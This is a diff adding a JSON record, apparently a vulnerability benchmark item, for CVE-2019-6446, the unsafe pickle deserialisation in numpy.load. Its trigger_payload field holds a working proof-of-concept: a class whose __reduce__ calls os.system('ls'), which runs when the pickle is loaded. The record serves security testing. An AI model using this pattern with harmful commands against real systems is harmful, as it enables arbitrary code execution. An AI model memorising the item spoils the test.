@@ -1,0 +1,15 @@
+{
+  "file_id": "882_numpy_issue_12759",
+  "numeric_id": "882",
+  "library_hint": "numpy",
+  "source": "github_issue",
+  "title": "numpy.load function with malicious pickle data can execute arbitrary commands",
+  "cve": "CVE-2019-6446",
+  "cwe": "CWE-502: Deserialization of Untrusted Data",
+  "library": "numpy",
+  "affected_version": "<= 1.16.0",
+  "vulnerable_function": "numpy.load",
+  "triggerability": "indirect",
+  "trigger_payload": "import numpy\nfrom numpy import __version__\nprint __version__\nimport os\nimport pickle\nclass Test(object):\n    def __init__(self):\n        self.a = 1\n    def __reduce__(self):\n        return (os.system,('ls',))\ntmpdaa = Test()\nwith open(\"a-file.pickle\",'wb') as f:\n    pickle.dump(tmpdaa,f)\nnumpy.load('a-file.pickle')",
+  "oracle": "command execution (e.g. ls command runs)"
+}
